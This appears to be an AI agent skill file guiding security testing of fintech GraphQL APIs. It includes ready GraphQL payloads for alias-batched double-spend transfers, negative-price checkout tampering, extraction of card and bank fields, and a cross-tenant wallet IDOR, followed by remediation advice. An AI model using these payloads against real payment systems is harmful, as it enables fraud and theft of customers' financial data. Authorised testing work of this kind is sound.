---
name: hunt-fintech-graphql
description: Hunting skill for financial technology and payment-specific GraphQL vulnerabilities. Built from disclosed fintech reports and banking API assessments. Covers financial mutation tampering (transfer, withdraw, refund, discount), alias-batching race conditions on ledgers and balances, negative/fractional currency values, field-level authz on banking PII, and cross-tenant wallet IDORs. Use when testing fintech, crypto, e-commerce checkout, or payment GraphQL endpoints.
sources: hackerone_public, fintech_disclosures, portswigger_research
report_count: 8
---

## Crown Jewel Targets

Fintech GraphQL endpoints represent the highest financial impact attack surface. Because GraphQL consolidates operations behind a single `/graphql` URI, payment mutations often rely on resolver-level rather than transport-level authorization, leading to critical financial discrepancies:

- **Payment & Transfer Mutations**: `transferFunds`, `processPayment`, `withdrawBalance`, `convertCurrency`, `refundTransaction`.
- **Ledger & Balance Race Conditions**: Alias-batching 20-50 simultaneous transfer or withdrawal operations in a single GraphQL request to exploit non-atomic database state transitions (double-spend / balance inflation).
- **Voucher & Reward Redemption**: Bypassing single-use constraints on promo codes, referral credits, and cashback via concurrent alias execution.
- **Rounding & Precision Manipulation**: Injecting fractional cents, negative quantities, or extreme floating-point numbers into payment resolvers.
- **Cross-Tenant Wallet IDOR**: Modifying `walletId`, `accountId`, `cardId`, or `ledgerId` parameters across tenant boundaries.

---

## Attack Surface Signals

**Endpoint Patterns:**
```
/graphql
/api/v1/payment/graphql
/api/fintech/graphql
/api/wallet/graphql
/checkout/graphql
```

**Sensitive GraphQL Operations & Types:**
```graphql
type Mutation {
  initiateTransfer(sourceWalletId: ID!, destWalletId: ID!, amount: Float!, currency: String!): TransferResult
  applyCoupon(code: String!, cartId: ID!): CartSummary
  processRefund(transactionId: ID!, reason: String!): RefundStatus
  updatePayoutAccount(bankAccountId: ID!, routingNumber: String!): BankAccount
  redeemCredit(voucherId: ID!, amount: Float!): CreditResult
}
```

---

## Attack Techniques & Exploitation Patterns

### 1. Alias-Batching Concurrency Attack (Double-Spend / Balance Over-Withdrawal)
GraphQL allows sending multiple aliased mutations within a single HTTP request. When the backend does not enforce database row-level locking (`SELECT ... FOR UPDATE`), all aliased mutations read the original balance before any mutation decrements it:

```graphql
mutation BatchTransfer {
  t1: initiateTransfer(destWalletId: "attacker_wallet", amount: 100.0) { success balance }
  t2: initiateTransfer(destWalletId: "attacker_wallet", amount: 100.0) { success balance }
  t3: initiateTransfer(destWalletId: "attacker_wallet", amount: 100.0) { success balance }
  t4: initiateTransfer(destWalletId: "attacker_wallet", amount: 100.0) { success balance }
  t5: initiateTransfer(destWalletId: "attacker_wallet", amount: 100.0) { success balance }
}
```

### 2. Negative Amount & Zero-Value Parameter Tampering
Payment and checkout mutations often fail to enforce positive sign constraints:

```graphql
mutation TamperCheckout {
  createInvoice(
    items: [
      { productId: "PROD-100", quantity: 1, unitPrice: 500.00 },
      { productId: "DISC-999", quantity: 1, unitPrice: -450.00 }
    ]
  ) {
    invoiceId
    totalDue
  }
}
```

### 3. Field-Level Banking PII Exposure
Resolvers may restrict top-level query access but fail to enforce object permissions on nested banking objects:

```graphql
query LeakBankingInfo($userId: ID!) {
  user(id: $userId) {
    id
    email
    paymentMethods {
      id
      cardNumber
      cvv
      bankRoutingNumber
      bankAccountNumber
      stripeCustomerId
    }
  }
}
```

### 4. Cross-Tenant Node IDOR on Financial Objects
Using Relay-style Node IDs to query or alter another tenant's payment method or ledger account:

```graphql
query FetchForeignWallet {
  node(id: "V2FsbGV0OjIwOTk=") { # Wallet:2099
    ... on Wallet {
      id
      ownerId
      availableBalance
      ledgerTransactions {
        amount
        destinationAccount
      }
    }
  }
}
```

---

## Validation & 7-Question Quality Gate

1. **Demonstrated Impact**: Must show actual balance manipulation, unauthorized transaction initiation, or cross-tenant PII retrieval.
2. **Reproducibility**: Provide exact minimal GraphQL query/mutation with variable payloads.
3. **Evidence Hygiene**: Redact live credit card numbers, real victim bank account digits, and active session bearer tokens.
4. **Remediation**:
   - Wrap financial operations in atomic database transactions with strict pessimistic locking.
   - Enforce server-side non-negative numeric constraints on all payment amounts.
   - Implement field-level authorization decorators on all financial resolvers.
   - Restrict maximum query complexity, depth, and batch operation count.
